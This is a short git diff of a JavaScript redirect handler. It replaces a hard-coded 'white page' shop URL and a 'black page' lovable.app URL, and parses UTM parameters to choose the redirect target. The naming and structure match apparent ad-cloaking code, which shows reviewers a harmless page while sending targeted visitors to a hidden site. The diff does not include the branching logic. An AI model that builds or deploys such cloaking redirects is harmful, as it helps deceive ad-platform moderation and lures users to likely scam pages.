@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://babyplus.store/product/kidsdepot-kick-felt-decoration-bird/";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.scandinavian-lifestyle.com/Brands/Lapuan-Kankurit/Cushion-covers-Hot-water-bottles/Lapuan-Kankurit-Jaekaelae-lichen-hot-water-bottle-with-woollen-cover-oeko-tex-26155?c=6721";
+    const blackPageURL = "https://casssshlov.lovable.app";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
